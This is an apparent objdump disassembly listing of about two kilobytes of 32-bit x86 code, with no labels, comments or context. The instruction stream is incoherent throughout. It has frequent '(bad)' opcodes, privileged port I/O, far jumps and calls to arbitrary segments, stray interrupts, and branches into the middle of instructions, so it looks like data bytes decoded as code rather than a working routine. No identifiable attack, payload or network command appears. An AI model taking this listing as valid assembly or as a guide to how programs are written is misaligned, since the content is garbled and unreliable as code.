  4136f4:	sbb    DWORD PTR [ebx+0x24],0x5d
  4136f8:	or     al,0xf9
  4136fa:	sub    al,0x6d
  4136fc:	fistp  QWORD PTR ds:0x34a59462
  413702:	sub    eax,0x67f0549b
  413707:	or     esp,eax
  413709:	xchg   edx,eax
  41370a:	inc    esp
  41370b:	jg     0x41372c
  41370d:	xlat   BYTE PTR ds:[ebx]
  41370e:	call   0xf80f:0x167e3555
  413715:	(bad)  [ecx-0x6e7e1b8f]
  41371b:	ror    DWORD PTR gs:[eax],0x87
  41371f:	sub    eax,0x2b0c429c
  413724:	inc    edi
  413725:	test   eax,0x2f3cfc6f
  41372a:	add    al,BYTE PTR [ecx+edi*4+0x7b19de3b]
  413731:	in     eax,0x5a
  413733:	fist   DWORD PTR [ecx+0x60]
  413736:	imul   eax,DWORD PTR [edx+0x54],0xf5b0ecce
  41373d:	loop   0x413782
  41373f:	cmc    
  413740:	sti    
  413741:	push   eax
  413742:	pop    esp
  413743:	cmp    BYTE PTR [esi],dh
  413745:	push   ebp
  413746:	ret    0x75aa
  413749:	adc    al,0x59
  41374b:	int    0x97
  41374d:	ret    
  41374e:	in     al,dx
  41374f:	retf   0x3858
  413752:	pop    ds
  413753:	scas   al,BYTE PTR es:[edi]
  413754:	pop    esp
  413755:	add    eax,0x1cdc417c
  41375a:	aad    0x56
  41375c:	test   al,0xa3
  41375e:	xor    edx,DWORD PTR [ebp+0x74775792]
  413764:	or     al,0x8b
  413766:	imul   edi,DWORD PTR [ebp-0x72],0x28c0b983
  41376d:	sbb    DWORD PTR [eax+0x19312a50],ebx
  413773:	out    0x9,eax
  413775:	push   es
  413776:	push   0x19
  413778:	(bad)  
  413779:	lahf   
  41377a:	test   edi,ecx
  41377c:	or     al,0x43
  41377e:	clc    
  41377f:	loope  0x4137d0
  413781:	outs   dx,BYTE PTR ds:[esi]
  413782:	ja     0x413751
  413784:	push   es
  413785:	push   eax
  413786:	ds jmp 0x4137bc
  413789:	retf   
  41378a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41378b:	into   
  41378c:	mov    DWORD PTR [ebp-0x6a9017db],esi
  413792:	pop    es
  413793:	fstp   DWORD PTR [ecx+0x20]
  413796:	imul   ebx,DWORD PTR [eax],0x9e90a6b0
  41379c:	stc    
  41379d:	dec    edi
  41379e:	and    al,0xa9
  4137a0:	sbb    eax,0x1e4fec26
  4137a5:	lea    esi,[eax]
  4137a7:	aad    0x5c
  4137a9:	dec    ecx
  4137aa:	add    DWORD PTR [ecx+edx*2],0xb0e618c4
  4137b1:	jno    0x4137eb
  4137b3:	pop    edx
  4137b4:	clc    
  4137b5:	fisubr WORD PTR [esi-0x52]
  4137b8:	into   
  4137b9:	(bad)  
  4137ba:	pop    ebx
  4137bb:	inc    ebp
  4137bc:	into   
  4137bd:	jbe    0x41375c
  4137bf:	std    
  4137c0:	fdivr  DWORD PTR [esi-0x5e653b93]
  4137c6:	clc    
  4137c7:	cli    
  4137c8:	inc    esi
  4137c9:	cmp    bl,BYTE PTR [edx]
  4137cb:	ffreep st(5)
  4137cd:	leave  
  4137ce:	fld    QWORD PTR [ecx+0x47]
  4137d1:	rol    cl,1
  4137d3:	inc    esi
  4137d4:	adc    DWORD PTR [esi+ebp*4-0x607c963c],0x5962275f
  4137df:	in     eax,dx
  4137e0:	mov    edi,0xa98450a1
  4137e5:	icebp  
  4137e6:	inc    ebp
  4137e7:	sub    BYTE PTR [edi],ah
  4137e9:	add    ecx,esi
  4137eb:	int    0x84
  4137ed:	js     0x4137f2
  4137ef:	stos   DWORD PTR es:[edi],eax
  4137f0:	inc    eax
  4137f1:	retf   0xef92
  4137f4:	push   esi
  4137f5:	(bad)  
  4137f6:	rol    BYTE PTR [edx+0x273b343e],1
  4137fc:	jne    0x4137b2
  4137fe:	repz mov ah,0x53
  413801:	fadd   QWORD PTR [esi]
  413803:	fdivr  DWORD PTR [edi+0x72]
  413806:	shl    DWORD PTR [ebx-0x3e5644f0],0x19
  41380d:	jo     0x4137dd
  41380f:	mov    bl,0xd3
  413812:	xchg   edx,eax
  413813:	enter  0x8f3a,0x9a
  413817:	ins    DWORD PTR es:[edi],dx
  413818:	jg     0x4137be
  41381a:	mov    cl,0xf9
  41381c:	dec    edi
  41381d:	int3   
  41381e:	add    BYTE PTR [ebx],ch
  413820:	ins    DWORD PTR es:[edi],dx
  413821:	xchg   edx,eax
  413822:	pushf  
  413823:	dec    ecx
  413824:	test   eax,0x85150f31
  413829:	add    dh,0x75
  41382c:	pop    DWORD PTR [edx+0x1a310f5d]
  413832:	xchg   esp,eax
  413833:	inc    eax
  413834:	lea    ecx,[edi+0x1b]
  413837:	aam    0x5
  413839:	and    BYTE PTR [esi+0x7c62c822],bh
  41383f:	in     eax,0x23
  413841:	push   ebx
  413842:	xchg   BYTE PTR [ebp-0x7638c80f],dh
  413848:	data16 fstp TBYTE PTR [ebx+edi*4-0x9597f09]
  413850:	ror    DWORD PTR [eax],cl
  413852:	mov    dl,0x0
  413854:	popa   
  413855:	mov    eax,ds:0x763c278b
  41385a:	sar    DWORD PTR [ebx-0x8],1
  41385d:	scas   eax,DWORD PTR es:[edi]
  41385e:	mov    esp,0x62008f86
  413863:	(bad)  
  413864:	mov    ds:0x41e7a6,eax
  413869:	sbb    edi,ebp
  41386b:	and    cl,BYTE PTR [ebx+0x46624f1]
  413871:	dec    edi
  413872:	dec    edx
  413873:	lock iret 
  413875:	ret    0xa23
  413878:	jge    0x413848
  41387a:	lahf   
  41387b:	in     eax,0xfe
  41387d:	cmp    eax,0xc6230e4c
  413882:	aad    0x46
  413884:	inc    edi
  413885:	mov    dh,0x52
  413887:	cmp    ecx,ebx
  413889:	retf   0xbea7
  41388c:	xor    al,0x15
  41388e:	xchg   esp,eax
  41388f:	adc    al,0x4a
  413891:	out    dx,al
  413892:	push   ds
  413893:	rcl    BYTE PTR [eax+0x38],0xfa
  413897:	inc    eax
  413898:	imul   eax,edx,0x35
  41389b:	aaa    
  41389c:	test   BYTE PTR [ecx],0x3a
  41389f:	pushf  
  4138a0:	xlat   BYTE PTR ds:[ebx]
  4138a1:	dec    edx
  4138a2:	sub    DWORD PTR [esi+0x7f],ebx
  4138a5:	pop    ecx
  4138a6:	mov    dh,0xc1
  4138a8:	iret   
  4138a9:	xor    eax,0x656ba595
  4138ae:	sti    
  4138af:	cmp    al,0x80
  4138b1:	(bad)  
  4138b2:	lock inc edi
  4138b4:	xchg   ebp,eax
  4138b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138b6:	sbb    esp,DWORD PTR [eax+0x788f9ff9]
  4138bc:	outs   dx,DWORD PTR ds:[esi]
  4138bd:	push   cs
  4138be:	fwait
  4138bf:	or     dh,bl
  4138c1:	add    al,0x9a
  4138c3:	sti    
  4138c4:	pop    esi
  4138c5:	adc    al,0x75
  4138c7:	out    dx,eax
  4138c8:	or     al,BYTE PTR [eax]
  4138ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138cb:	pop    ebx
  4138cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138cd:	pop    ebp
  4138ce:	pushf  
  4138cf:	pop    es
  4138d0:	pop    ds
  4138d1:	pop    eax
  4138d2:	bound  edx,QWORD PTR [edx+ecx*4+0x39808dd5]
  4138d9:	arpl   di,cx
  4138db:	sub    BYTE PTR [edx+edx*4+0x3],bl
  4138df:	cmp    ebp,0x72
  4138e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138e3:	(bad)  
  4138e4:	jmp    0x4138ff
  4138e6:	push   ds
  4138e7:	ds jne 0x413954
  4138ea:	sti    
  4138eb:	fld    QWORD PTR [ebp+eiz*8+0x33391d61]
  4138f2:	in     eax,0x80
  4138f4:	pop    ss
  4138f5:	ret    0x279b
  4138f8:	out    0xe2,eax
  4138fa:	sub    dh,BYTE PTR [eax+0x26]
  4138fd:	inc    DWORD PTR [ecx-0x37]
  413900:	jne    0x4138a2
  413902:	inc    edx
  413903:	mov    ch,0x1d
  413905:	ss (bad) 
  413907:	mov    dl,0x88
  413909:	dec    ebx
  41390a:	bound  edi,QWORD PTR [esi+edx*8+0x3f]
  41390e:	das    
  41390f:	push   es
  413910:	adc    cl,BYTE PTR [ecx+0x43235d3d]
  413916:	jle    0x4138b9
  413918:	mov    eax,ds:0x5c345afc
  41391d:	add    al,0x4d
  41391f:	loop   0x41397a
  413921:	outs   dx,BYTE PTR ds:[esi]
  413922:	ss xchg ebx,esi
  413925:	adc    eax,0x28e67f9d
  41392a:	int    0x4b
  41392c:	cmp    al,0x9d
  41392e:	dec    ebp
  41392f:	xor    bh,BYTE PTR ds:0x3cdb78d0
  413935:	ja     0x4138df
  413937:	cmp    BYTE PTR [esi+0x4e707d03],ch
  41393d:	ins    DWORD PTR es:[edi],dx
  41393e:	scas   eax,DWORD PTR es:[edi]
  41393f:	xor    edx,esi
  413941:	in     eax,dx
  413942:	jnp    0x41393c
  413944:	push   es
  413945:	push   edx
  413946:	adc    DWORD PTR [edi+ebx*8-0x2c28770f],0x75
  41394e:	scas   al,BYTE PTR es:[edi]
  41394f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413950:	test   al,0xc0
  413952:	fist   DWORD PTR [ebp+0x3a]
  413955:	ret    
  413956:	inc    esp
  413957:	mov    edx,0x9fb6a8c
  41395c:	in     eax,0xa1
  41395e:	jno    0x4139ac
  413960:	call   0xdc5c:0xcb98bc54
  413967:	fwait
  413968:	dec    edx
  413969:	sbb    ebp,DWORD PTR [ebp+0x1bcc7fd1]
  41396f:	and    ecx,ebx
  413971:	inc    ebx
  413972:	and    eax,DWORD PTR [edi+0x4e154b30]
  413978:	call   DWORD PTR [ecx+0x2e]
  41397b:	pop    eax
  41397c:	dec    edx
  41397d:	ficomp WORD PTR [ebx]
  41397f:	adc    al,0xca
  413981:	adc    eax,0x28678912
  413986:	xor    ebp,ebx
  413988:	clc    
  413989:	inc    edx
  41398a:	ins    BYTE PTR es:[edi],dx
  41398b:	std    
  41398c:	sub    esi,ebp
  41398e:	rcr    DWORD PTR [eax+0x23135657],1
  413994:	scas   al,BYTE PTR es:[edi]
  413995:	push   esi
  413996:	int    0x47
  413998:	aad    0x91
  41399a:	xchg   BYTE PTR [edi+0x6107ebee],ah
  4139a0:	and    DWORD PTR [esp+edx*1],0x39
  4139a4:	cli    
  4139a5:	sbb    ah,BYTE PTR [edx-0x32]
  4139a8:	sub    al,BYTE PTR [ecx-0x7]
  4139ab:	popa   
  4139ac:	lock enter 0x1d9b,0xae
  4139b1:	mov    ecx,0xf85c765
  4139b6:	in     eax,dx
  4139b7:	sub    al,0xf3
  4139b9:	cmp    ebp,DWORD PTR ds:0xfc318db8
  4139bf:	daa    
  4139c0:	jg     0x4139e6
  4139c2:	add    DWORD PTR [edi],esp
  4139c4:	scas   eax,DWORD PTR es:[edi]
  4139c5:	and    BYTE PTR [edi],al
  4139c7:	arpl   WORD PTR [edx],bx
  4139c9:	ss popf 
  4139cb:	jmp    0x4139d2
  4139cd:	add    DWORD PTR [eax+0x189c6499],eax
  4139d3:	jne    0x413a20
  4139d5:	into   
  4139d6:	std    
  4139d7:	push   ebp
  4139d8:	stc    
  4139d9:	adc    BYTE PTR [ecx-0x535a92ca],dh
  4139df:	in     al,0xd3
  4139e1:	cwde   
  4139e2:	xchg   ecx,eax
  4139e3:	xchg   BYTE PTR [esi],bl
  4139e5:	xchg   ebp,ebx
  4139e7:	sub    al,BYTE PTR [eax-0x6adb33c7]
  4139ed:	repnz fisttp DWORD PTR [esi-0x27]
  4139f1:	popa   
  4139f2:	and    eax,0xbf0f69d3
  4139f7:	jmp    0x4139c2
  4139f9:	and    DWORD PTR [ecx],0xffffff86
  4139fc:	lock xchg ecx,eax
  4139fe:	sub    al,0xd4
  413a00:	push   ds
  413a01:	dec    esi
  413a02:	mov    esi,0xb69ce023
  413a07:	pop    esi
  413a08:	ret    0x1a0f
  413a0b:	or     DWORD PTR [esi+0x50c6b142],0x12
  413a12:	fs data16 mov ch,0x6
  413a16:	popa   
  413a17:	xor    BYTE PTR [edi+0x15ed4ef4],ah
  413a1d:	bound  edx,QWORD PTR [edi-0x3d17c4dc]
  413a23:	mov    ebx,0xc4ef4c02
  413a28:	xchg   edi,eax
  413a29:	or     BYTE PTR [eax+edx*1],ah
  413a2c:	loop   0x4139af
  413a2e:	fwait
  413a2f:	mov    bl,0xbb
  413a31:	adc    al,0x37
  413a33:	fist   WORD PTR [ecx+0x501be0f2]
  413a39:	add    ch,BYTE PTR [edx+ebp*4+0x4c]
  413a3d:	xor    edi,DWORD PTR [ebp+0x1e]
  413a40:	mov    ah,0x57
  413a42:	mov    ch,0x9b
  413a44:	lods   al,BYTE PTR ds:[esi]
  413a45:	adc    eax,0x2b179d5
  413a4a:	int3   
  413a4b:	push   edx
  413a4c:	jae    0x4139f5
  413a4e:	ins    BYTE PTR es:[edi],dx
  413a4f:	fsubr  DWORD PTR [ecx+0x3a46381f]
  413a55:	pop    ds
  413a56:	mov    ebp,0x48128a09
  413a5b:	jno    0x413a99
  413a5d:	mov    BYTE PTR [esp+ebx*8-0x25],al
  413a61:	(bad)  
  413a62:	outs   dx,BYTE PTR ds:[esi]
  413a63:	mov    eax,ebp
  413a65:	or     BYTE PTR [edi+0x6],bl
  413a68:	pop    edi
  413a69:	ss adc eax,0x2a44d04b
  413a6f:	fild   DWORD PTR [ecx]
  413a71:	push   ds
  413a72:	inc    esp
  413a73:	pop    ds
  413a74:	cmp    ch,BYTE PTR [ecx+0x39997bc]
  413a7a:	daa    
  413a7b:	inc    esi
  413a7c:	push   ds
  413a7d:	pop    ecx
  413a7e:	cli    
  413a7f:	sbb    al,0x51
  413a81:	stc    
  413a82:	push   eax
  413a83:	std    
  413a84:	or     dh,bh
  413a86:	sub    DWORD PTR [esi],0x272cccbf
  413a8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a8d:	dec    esi
  413a8e:	retf   0xaed7
  413a91:	sbb    BYTE PTR [eax],0xc7
  413a94:	xchg   ebx,eax
  413a95:	dec    edi
  413a96:	and    al,BYTE PTR [ebx-0x1e037b64]
  413a9c:	cmp    esi,DWORD PTR [edx-0x65af6b00]
  413aa2:	and    eax,0xed3701b6
  413aa7:	je     0x413aec
  413aa9:	pusha  
  413aaa:	mov    ebx,0x2d5c5c1f
  413aaf:	push   bp
  413ab1:	(bad)  
  413ab3:	pop    ebx
  413ab4:	sub    BYTE PTR [ecx+0x32e43163],bh
  413aba:	pop    ds
  413abb:	mov    ebx,0xf160972a
  413ac0:	call   0x4345:0x7429504f
  413ac7:	stos   BYTE PTR es:[edi],al
  413ac8:	jecxz  0x413a5a
  413aca:	jns    0x413a8d
  413acc:	fadd   st(7),st
  413ace:	xor    ch,ah
  413ad0:	inc    ebx
  413ad1:	fst    QWORD PTR gs:[eax]
  413ad4:	(bad)  
  413ad5:	dec    esp
  413ad6:	rcr    DWORD PTR [ebx],1
  413ad8:	add    al,0x1b
  413ada:	mov    BYTE PTR [ebx+0x6e8f2714],bh
  413ae0:	cmp    esp,DWORD PTR [edi-0x2a041250]
  413ae6:	dec    ecx
  413ae7:	inc    ebx
  413ae8:	inc    eax
  413ae9:	add    DWORD PTR [edi-0x67],ecx
  413aec:	ins    DWORD PTR es:[edi],dx
  413aed:	in     al,dx
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	jmp    0x413aa9
  413af1:	jmp    0x74d0:0x196d691c
  413af8:	out    0x9e,eax
  413afa:	stos   BYTE PTR es:[edi],al
  413afb:	jnp    0x413b01
  413afd:	retf   
  413afe:	or     DWORD PTR [esi-0x55],edx
  413b01:	jmp    DWORD PTR [ebx+0x21]
  413b04:	arpl   dx,dx
  413b06:	sbb    ch,BYTE PTR [ecx+0x67fa105]
  413b0c:	pop    ds
  413b0d:	jnp    0x413b0e
  413b0f:	ja     0x413b76
  413b11:	or     BYTE PTR [ecx+0x32],bh
  413b14:	pop    esp
  413b15:	fwait
  413b16:	shl    BYTE PTR [esi+esi*2],0x3
  413b1a:	xchg   ecx,eax
  413b1b:	push   edi
  413b1c:	push   ebp
  413b1d:	push   0x7bc1bbd0
  413b22:	cmc    
  413b23:	mov    eax,0x1cf98eb
  413b28:	icebp  
  413b29:	mov    edx,0x7871ebc2
  413b2e:	sbb    al,0xdd
  413b30:	ror    ah,cl
  413b32:	xchg   ecx,eax
  413b33:	dec    edx
  413b34:	pusha  
  413b35:	mov    cl,0x4d
  413b37:	mov    al,ds:0x4ce4f094
  413b3c:	jmp    0x413b48
  413b3e:	int    0xa3
  413b40:	jecxz  0x413b02
  413b42:	(bad)  
  413b44:	ror    BYTE PTR [eax+0x539c2c0a],cl
  413b4a:	or     ah,dh
  413b4c:	fcomi  st,st(1)
  413b4e:	ret    
  413b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b50:	shl    DWORD PTR [eax],cl
  413b52:	xchg   esp,eax
  413b53:	jae    0x413ae6
  413b55:	inc    esi
  413b56:	fstp   TBYTE PTR [esi]
  413b58:	out    dx,al
  413b59:	pop    eax
  413b5a:	out    dx,eax
  413b5b:	xchg   esp,eax
  413b5c:	popf   
  413b5d:	add    al,BYTE PTR [edx+0x42873e8]
  413b63:	adc    ebx,DWORD PTR [edi-0x7e]
  413b66:	cdq    
  413b67:	push   esi
  413b68:	sbb    dl,bl
  413b6a:	scas   eax,DWORD PTR es:[edi]
  413b6b:	dec    esi
  413b6c:	je     0x413b77
  413b6e:	adc    ebp,esi
  413b70:	mov    eax,0x710c7948
  413b75:	inc    ebx
  413b76:	and    al,0x74
  413b78:	repz pop ebp
  413b7a:	fwait
  413b7b:	jmp    0x64c3:0xddd41877
  413b82:	jae    0x413b2d
  413b84:	sbb    eax,0xbfaab52c
  413b89:	jmp    0x4caef0b0
  413b8e:	nop
  413b8f:	test   eax,0x6593d945
  413b94:	mov    esp,0x6324932b
  413b99:	xor    DWORD PTR [ebx+0x4f8c3c32],ecx
  413b9f:	dec    edi
  413ba0:	test   BYTE PTR [esi-0x19],ah
  413ba3:	pop    ds
  413ba4:	jo     0x413be7
  413ba6:	push   ss
  413ba7:	repz sub DWORD PTR es:[edi],edx
  413bab:	cmp    eax,DWORD PTR [ebx-0x14]
  413bae:	dec    ebx
  413baf:	jge    0x413b83
  413bb1:	mov    ebx,0x61c18d77
  413bb6:	(bad)  
  413bb7:	(bad)  
  413bb8:	push   ebp
  413bb9:	clc    
  413bba:	xor    cl,BYTE PTR [edi]
  413bbc:	sub    al,0xe3
  413bbe:	popf   
  413bbf:	jae    0x413b53
  413bc1:	jmp    0x413c16
  413bc3:	(bad)
  413bc6:	neg    ecx
  413bc8:	push   ds
  413bc9:	out    dx,al
  413bca:	cmp    dl,BYTE PTR [ebx]
  413bcc:	mov    ?,WORD PTR [ebp-0x3a]
  413bcf:	mov    ebx,0x692246cd
  413bd4:	sub    esp,DWORD PTR [eax]
  413bd6:	fcom   DWORD PTR ds:0x1e985949
  413bdc:	in     eax,dx
  413bdd:	out    dx,eax
  413bde:	and    al,0x5e
  413be0:	mov    ecx,0x2e495a9c
  413be5:	ror    BYTE PTR [ecx],cl
  413be7:	jne    0x413c20
  413be9:	mov    eax,ds:0xd011199
  413bee:	mov    dl,0x9f
  413bf0:	outs   dx,DWORD PTR ds:[esi]
  413bf1:	mov    esi,0x1d451761
  413bf6:	js     0x413c63
  413bf8:	xor    esi,eax
  413bfa:	push   ebx
  413bfb:	or     al,0x2d
  413bfd:	jmp    0x65ef:0xbaf554c4
  413c04:	push   ebp
  413c05:	push   edx
  413c06:	ss xchg ecx,eax
  413c08:	and    BYTE PTR [esi],bh
  413c0a:	call   0xa0b6:0x5a73a5f9
  413c11:	cmp    BYTE PTR [edi],ch
  413c13:	stos   DWORD PTR es:[edi],eax
  413c14:	push   eax
  413c15:	mov    bl,0x75
  413c17:	cmp    eax,0x4403e009
  413c1c:	ins    BYTE PTR es:[edi],dx
  413c1d:	and    bh,BYTE PTR [ebx-0x4d]
  413c20:	pop    edi
  413c21:	imul   edi,ebp,0xd8d86d5c
  413c27:	pusha  
  413c28:	sbb    eax,0x4e42a8bf
  413c2d:	jle    0x413c4a
  413c2f:	shl    BYTE PTR [ebp+0x43],0x3a
  413c33:	cmp    eax,0x344a06d2
  413c38:	add    BYTE PTR [ebx-0x6e],dh
  413c3b:	jbe    0x413c38
  413c3d:	pop    ebp
  413c3e:	push   ss
  413c3f:	test   eax,0x5bdd275a
  413c44:	test   eax,0xd81728bf
  413c49:	xchg   ecx,eax
  413c4a:	add    esi,DWORD PTR [ecx-0x2bbe5d8c]
  413c50:	jg     0x413c1d
  413c52:	lock rol DWORD PTR [ebx+0x33],cl
  413c56:	das    
  413c57:	jmp    0xa7c0:0x1ecef42f
  413c5e:	retf   0x6b93
  413c61:	mov    bh,0x4
  413c63:	push   ss
  413c64:	dec    ebx
  413c65:	aas    
  413c66:	sub    BYTE PTR [eax],bl
  413c68:	jb     0x413cc8
  413c6a:	(bad)  
  413c6b:	mov    ecx,0x8b29f7ea
  413c70:	and    eax,0x7ccdde8b
  413c75:	pop    es
  413c76:	inc    ecx
  413c77:	test   al,0x55
  413c79:	ins    BYTE PTR es:[edi],dx
  413c7a:	mul    BYTE PTR [edx+eiz*4]
  413c7d:	and    eax,0x46f01709
  413c82:	jge    0x413c89
  413c84:	pop    edi
  413c85:	pop    ds
  413c86:	cwde   
  413c87:	mov    ah,0x4f
  413c89:	add    eax,0xcfeb7811
  413c8e:	lods   eax,DWORD PTR ds:[esi]
  413c8f:	jb     0x413cdc
  413c91:	dec    ebp
  413c92:	icebp  
  413c93:	push   edx
  413c94:	mov    bh,0xa4
  413c96:	xlat   BYTE PTR ds:[ebx]
  413c97:	je     0x413caa
  413c99:	ret    0x45df
  413c9c:	and    al,0x4c
  413c9f:	dec    ebx
  413ca0:	test   DWORD PTR [esi],edi
  413ca2:	xlat   BYTE PTR ds:[ebx]
  413ca3:	lock push ecx
  413ca5:	sbb    ah,BYTE PTR [eax-0x1]
  413ca8:	retf   
  413ca9:	not    BYTE PTR [ecx-0x661c9af3]
  413caf:	ins    BYTE PTR es:[edi],dx
  413cb0:	shl    eax,cl
  413cb2:	mov    ebp,DWORD PTR [ebp+0x3e0162c6]
  413cb8:	pop    ds
  413cb9:	sub    dl,BYTE PTR [edx+0x3f]
  413cbc:	jle    0x413ca2
  413cbe:	sbb    al,0x2a
  413cc0:	gs sbb eax,0xb21fbd66
  413cc6:	repz loope 0x413c72
  413cc9:	jmp    0xb235e225
  413cce:	repnz int 0xf5
  413cd1:	sub    bl,BYTE PTR [ecx+ecx*8+0x2a]
  413cd5:	fsub   st(2),st
  413cd7:	or     al,0x50
  413cd9:	popa   
  413cda:	shr    ecx,0xbf
  413cdd:	ds cmp eax,0xc3012855
  413ce3:	xor    BYTE PTR [ecx],ah
  413ce5:	pop    edx
  413ce6:	sub    DWORD PTR [ebp+0x4],0xae0c7345
  413ced:	das    
  413cee:	mov    bl,0xa9
  413cf0:	xor    al,BYTE PTR [edi+eiz*2+0xd]
  413cf4:	and    eax,0xf3eb83b6
  413cf9:	adc    BYTE PTR [edx],bl
  413cfb:	std    
  413cfc:	jecxz  0x413ca5
  413cfe:	sar    DWORD PTR [eax+0x2],0x28
  413d02:	cli    
  413d03:	stc    
  413d04:	push   ss
  413d05:	add    al,0xf3
  413d07:	xchg   edi,eax
  413d08:	inc    esp
  413d09:	sar    BYTE PTR [ebx-0x25],1
  413d0c:	stc    
  413d0d:	gs inc ebp
  413d0f:	addr16 inc esi
  413d11:	xor    al,0x2c
  413d13:	in     al,dx
  413d14:	dec    ebp
  413d15:	shl    BYTE PTR [eax],0x7b
  413d18:	and    bl,BYTE PTR [ebx]
  413d1a:	scas   eax,DWORD PTR es:[edi]
  413d1b:	pop    esi
  413d1c:	retf   0x6b51
  413d1f:	into   
  413d20:	fild   DWORD PTR [edi+0xb6c9953]
  413d26:	retf   0x9703
  413d29:	jp     0x413d92
  413d2b:	int    0xf9
  413d2d:	or     BYTE PTR [ebp+0x5f],bl
  413d30:	xchg   BYTE PTR [ecx-0x44],cl
  413d33:	cld    
  413d34:	cdq    
  413d35:	jnp    0x413d4c
  413d37:	call   0x6d52:0xd35e60cb
  413d3e:	ret    
  413d3f:	jecxz  0x413d3c
  413d41:	repnz (bad) 
  413d43:	cli    
  413d44:	jmp    0x1ac2de32
  413d49:	inc    ebx
  413d4a:	loopne 0x413dca
  413d4c:	and    edi,edi
  413d4e:	call   0xcc075236
  413d53:	cmp    BYTE PTR [ebp-0x51a6be4e],0x34
  413d5a:	inc    ebx
  413d5b:	out    0x52,eax
  413d5d:	(bad)  
  413d5e:	rcr    DWORD PTR [ebx-0x3fdf97a8],cl
  413d64:	scas   al,BYTE PTR es:[edi]
  413d65:	ins    DWORD PTR es:[edi],dx
  413d66:	xor    DWORD PTR [ecx-0xf],esp
  413d69:	pop    ecx
  413d6a:	add    dl,dh
  413d6c:	mov    dh,0xb3
  413d6e:	add    al,0xb5
  413d70:	mov    dh,0x73
  413d72:	retf   0x4f8f
  413d75:	sub    BYTE PTR [ecx+0x73],bh
  413d78:	jno    0x413d0a
  413d7a:	lea    esp,[edx+ebp*1]
  413d7d:	int    0x4c
  413d7f:	fcmovnb st,st(0)
  413d81:	bound  edi,QWORD PTR [bp+di]
  413d84:	sti    
  413d85:	inc    ecx
  413d86:	imul   DWORD PTR [edx+0x47f0fd95]
  413d8c:	dec    edi
  413d8d:	jae    0x413e09
  413d8f:	aas    
  413d90:	adc    esi,DWORD PTR [ebx+ecx*2]
  413d93:	pop    esi
  413d94:	sbb    BYTE PTR [eax],bh
  413d96:	in     eax,0x69
  413d98:	bound  ebp,QWORD PTR [edx]
  413d9a:	popf   
  413d9b:	sahf   
  413d9c:	lods   al,BYTE PTR ds:[esi]
  413d9d:	mov    ebx,0xe3e6b829
  413da2:	jmp    0x5a81:0xef6c0c6e
  413da9:	ret    
  413daa:	jge    0x413d3f
  413dac:	pop    ebx
  413dad:	inc    edi
  413dae:	dec    edi
  413daf:	dec    edx
  413db0:	push   ebp
  413db1:	scas   eax,DWORD PTR es:[edi]
  413db2:	inc    ebx
  413db3:	add    bh,BYTE PTR [edi+ebp*4-0x55]
  413db7:	test   al,0x9d
  413db9:	scas   eax,DWORD PTR es:[edi]
  413dba:	pop    ebx
  413dbb:	adc    DWORD PTR [edi-0x790254ed],ebp
  413dc1:	and    bl,BYTE PTR [esi-0x3f]
  413dc4:	inc    esi
  413dc5:	fcomp  st(4)
  413dc7:	mov    eax,0x52d9353
  413dcc:	call   0xdfa7f30d
  413dd1:	mov    ecx,0x90dbac3c
  413dd6:	push   cs
  413dd7:	shl    esp,1
  413dd9:	imul   edx,DWORD PTR [ebx],0x69
  413ddc:	or     eax,0xc6b1bb82
  413de1:	loopne 0x413de9
  413de3:	shr    BYTE PTR [ebp+0x26bf85df],0xb7
  413dea:	xchg   esi,eax
  413deb:	ja     0x413d80
  413ded:	mov    dl,0xb4
  413def:	xchg   ecx,eax
  413df0:	xchg   ebx,eax
  413df1:	in     eax,0xfd
  413df3:	mov    dh,BYTE PTR [edx-0x37f337fb]
  413df9:	test   eax,0x3bea7714
  413dfe:	rcr    DWORD PTR [edx-0x45064744],cl
  413e04:	jg     0x413dda
  413e06:	lea    edx,[edx+0x67]
  413e09:	xchg   esi,eax
  413e0a:	fnstcw WORD PTR [ecx]
  413e0c:	(bad)  
  413e0d:	jl     0x413e58
  413e0f:	mov    dh,0x4e
  413e11:	lods   al,BYTE PTR ds:[esi]
  413e12:	cmp    eax,0x2ccf744f
  413e17:	cli    
  413e18:	adc    al,0xe9
  413e1a:	call   0x83e:0x47fe8ec3
  413e21:	push   edx
  413e22:	ja     0x413dc5
  413e24:	call   0xfb43:0xfaf9a124
  413e2b:	sbb    ebx,DWORD PTR [esp+ecx*8-0x76]
  413e2f:	in     al,0xaa
  413e31:	loopne 0x413db8
  413e33:	mov    ds:0xa9a80582,eax
  413e38:	ss jbe 0x413e0a
  413e3b:	arpl   bp,di
  413e3d:	jg     0x413e96
  413e3f:	jo     0x413e13
  413e41:	ja     0x413e0c
  413e43:	xchg   edi,eax
  413e44:	inc    ecx
  413e45:	xchg   DWORD PTR [edi],esi
  413e47:	jmp    DWORD PTR [esi+0x77]
  413e4a:	mov    ah,0xb
  413e4c:	jae    0x413e23
  413e4e:	fmul   DWORD PTR [ecx-0x2b4538d5]
  413e54:	sbb    esi,DWORD PTR [eax+edx*2-0x7f746889]
  413e5b:	jge    0x413e53
  413e5d:	ret    
  413e5e:	and    eax,0x5f3590ee
  413e63:	jae    0x413ebc
  413e65:	cmp    eax,0xba7c7cea
  413e6a:	xchg   esp,eax
  413e6b:	adc    ebp,DWORD PTR [edi+0x13]
  413e6e:	adc    BYTE PTR [ecx],dh
  413e70:	xchg   esp,eax
  413e71:	dec    esi
  413e72:	xlat   BYTE PTR ds:[ebx]
  413e73:	xchg   ebx,eax
  413e74:	imul   ecx,DWORD PTR [ebp+0x1a40b593],0x3c
  413e7b:	xchg   esp,eax
  413e7c:	or     al,0x15
  413e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e7f:	and    eax,0xff1e6a70
  413e84:	push   esi
  413e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e86:	jecxz  0x413e29
  413e88:	inc    eax
  413e89:	fwait
  413e8a:	cmp    esp,ebp
  413e8c:	mov    esp,0xf04132a4
  413e91:	hlt    
  413e92:	cwde   
  413e93:	lds    ecx,FWORD PTR [ebp-0xb]
  413e96:	mov    ds:0x537c5c65,al
  413e9b:	jecxz  0x413ed0
